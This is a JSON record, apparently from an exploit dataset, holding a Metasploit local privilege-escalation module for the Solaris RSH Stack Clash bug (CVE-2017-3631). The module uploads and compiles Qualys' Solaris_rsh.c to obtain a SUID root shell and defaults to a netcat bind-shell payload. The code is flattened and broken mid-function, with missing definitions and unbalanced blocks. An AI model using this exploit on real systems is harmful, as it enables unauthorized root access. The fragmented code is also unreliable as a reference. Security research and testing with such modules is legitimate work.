{
    "text": "vul_name : Solaris RSH Stack Clash Privilege Escalation ， vul_cve : CVE-2017-3631 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = GoodRanking ， include Msf : Post : File ， include Msf : Post : Solaris : Priv ， include Msf : Post : Solaris : System ， include Msf : Post : Solaris : Kernel ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Solaris RSH Stack Clash Privilege Escalation' ,  ， 'Description' => %q{ ， This module exploits a vulnerability in RSH on unpatched Solaris ， systems which allows users to gain root privileges. ， The stack guard page on unpatched Solaris systems is of ， insufficient size to prevent collisions between the stack ， and heap memory , aka Stack Clash. ， This module uploads and executes Qualys' Solaris_rsh.c exploit ,  ， which exploits a vulnerability in RSH to bypass the stack guard ， page to write to the stack and create a SUID root shell. ， This module has offsets for Solaris versions 11.1 ( x86 ) and ， Solaris 11.3 ( x86 ) . ， Exploitation will usually complete within a few minutes using ， the default number of worker threads ( 10 ) . Occasionally ,  ， exploitation will fail. If the target system is vulnerable ,  ， usually re-running the exploit will be successful. ， This module has been tested successfully on Solaris 11.1 ( x86 )  ， and Solaris 11.3 ( x86 ) . ， } ,  ， ' ，  [  ，  [ 'BID' , '99151' ]  ,  ，  [ 'BID' , '99153' ]  ,  ，  [ 'CVE' , '2017-1000364' ]  ,  ，  [ 'CVE' , '2017-3629' ]  ,  ，  [ 'CVE' , '2017-3630' ]  ,  ，  [ 'CVE' , '2017-3631' ]  ,  ，  [ 'EDB' , '42270' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'Notes' => { 'AKA' => [ 'Stack Clash' , 'Solaris_rsh.c' ] } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Qualys Corporation' ,  # Stack Clash technique and Solaris_rsh.c exploit ， 'Brendan Coles' # Metasploit ，  ]  ,  ， 'DisclosureDate' => 'Jun 19 2017' ,  ， 'Privileged' => true ,  ， 'Platform' => [ 'unix' ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , {} ]  ,  ，  [ 'Solaris 11.1' , {} ]  ,  ，  [ 'Solaris 11.3' , {} ]  ，  ]  ,  ， 'DefaultOptions' => ， { ， 'PAYLOAD' => 'cmd/unix/bind_netcat' ,  ， 'WfsDelay' => 10 ,  ， 'PrependFork' => true ， } ,  ， 'DefaultTarget' => 0 )  ， register_options [  ， OptInt.new ( 'WORKERS' ,  [ true , 'Number of workers' , '10' ]  )  ,  ， OptString.new ( 'RSH_PATH' ,  [ true , 'Path to rsh executable' , '/usr/bin/rsh' ]  )  ，  ]  ， register_advanced_options [  ， OptBool.new ( 'ForceExploit' ,  [ false , 'Override check result' , false ]  )  ,  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ，  ]  ， end ， def rsh_path ， datastore [ 'RSH_PATH' ]  ， end ， vprint_status \"Creating ' # {path}' directory\" ， cmd_exec \"mkdir -p # {path}\" ， register_dir_for_cleanup path ， end ， print_status \"Writing ' # {path}' (  # {data.size} bytes ) .\" ， rm_f path ， write_file path , data ， register_file_for_cleanup path ， end ， upload \" # {path}.c\" , data ， output = cmd_exec \"PATH= $ PATH : /usr/sfw/bin/ : /opt/sfw/bin/ : /opt/csw/bin gcc -Wall -std=gnu99 -o # {path} # {path}.c\" ， unless output.blank? ， print_error output ， fail_with Failure : Unknown , \" # {path}.c failed to compile\" ， end ， register_file_for_cleanup path ， end ， print_status \"Symlinking # {link_target} to # {link_name}\" ， rm_f link_name ， cmd_exec \"ln -sf # {link_target} # {link_name}\" ， register_file_for_cleanup link_name ， end ， def check ， unless setuid? rsh_path ， vprint_error \" # {rsh_path} is not setuid\"",
    "time": "2018.10.16"
}